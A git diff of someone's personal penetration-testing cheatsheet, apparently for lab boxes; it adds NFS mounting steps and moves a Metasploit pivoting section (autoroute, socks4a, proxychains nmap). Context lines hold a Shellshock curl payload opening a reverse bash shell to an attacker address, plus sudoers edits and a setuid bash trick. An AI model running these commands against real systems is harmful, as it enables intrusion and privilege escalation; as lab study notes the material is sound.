@@ -1,5 +1,5 @@
 # My Notes / Cheatsheet
-### Last Updated: 21 Oct 2021
+### Last Updated: 12 Nov 2021
 Notes related to Vuln Assmnt/PenTesting 
 
 #### Approach for Compromising a box
@@ -102,17 +102,12 @@ chmod +s /bin/bash
 > 1. make sure /etc/sudoers is has correct permsissions by running ```sudo chmod 0555 /etc/sudoers```
 > 1. echo <existing_user_present> ALL=(ALL) ALL >> sudoers
 
+#### NFS / RPC
+> 1. ``` showmount -e 10.11.1.72```
+> 1. ``` mkdir /mnt/72shiz```
+> 1.``` mount -t nfs 10.11.1.72:/home /mnt/72shiz/```
 
-#### Pivoting crap - MSF, socks4a and proxychains
-> 1. ``` use msf exploit/multi/handler ```
-> 1. get session as reverse shell
-> 1. upgrade the session to meterpreter by running command --> ``` sessions -u 1 ```
-> 1. go to upgraded meterpreter session and type the autoroute command ---> ``` run autoroute -s <the network you want to access> ```
-> 1. to see if the new network is accessible, run **ping sweep* by typing command --->  ``` use -> multi/gather/ping_sweep ```. use new network and meterpreter session number.
-> 1. to set up socks4a server ---> ```use auxiliary/server/socks4a```
-> 1. edit proxychains.conf, add ```sock4a``` proxy with 127.0.0.1 and port 1080.
-> 1. next run proxychains with sudo before nmap. remember proxychains can only get TCP/UDP no ICMP, so use nmap something like ```sudo proxychains nmap -sT -sC -sV -r -v -Pn <IP> ```
-  
+	
 #### cgi-bin folder or ShellShock
 > e.g from vulnhub symfonos v3 following gives Rev Shell @ port 9999.\
 > ```bash curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.10.100/9999 0>&1' http://192.168.10.10/cgi-bin underworld/test.sh```
@@ -185,6 +180,16 @@ chmod +s /bin/bash
 > 1. ``` export TERM=xterm-256color ```
 > 1. ``` stty rows <num> columns <cols>; e.g stty rows 29 columns 103 stty rows 34 columns 134```
 
+#### Pivoting crap - MSF, socks4a and proxychains
+> 1. ``` use msf exploit/multi/handler ```
+> 1. get session as reverse shell
+> 1. upgrade the session to meterpreter by running command --> ``` sessions -u 1 ```
+> 1. go to upgraded meterpreter session and type the autoroute command ---> ``` run autoroute -s <the network you want to access> ```
+> 1. to see if the new network is accessible, run **ping sweep* by typing command --->  ``` use -> multi/gather/ping_sweep ```. use new network and meterpreter session number.
+> 1. to set up socks4a server ---> ```use auxiliary/server/socks4a```
+> 1. edit proxychains.conf, add ***sock4a*** proxy with 127.0.0.1 and port 1080.
+> 1. next run proxychains with sudo before nmap. remember proxychains can only get TCP/UDP no ICMP, so use nmap something like ```sudo proxychains nmap -sT -sC -sV -r -v -Pn <IP> ```
+	
 > 1. **In Attacker console**
 > 1. ``` stty size ``` (to find ROWS and COLUMNS value)
 
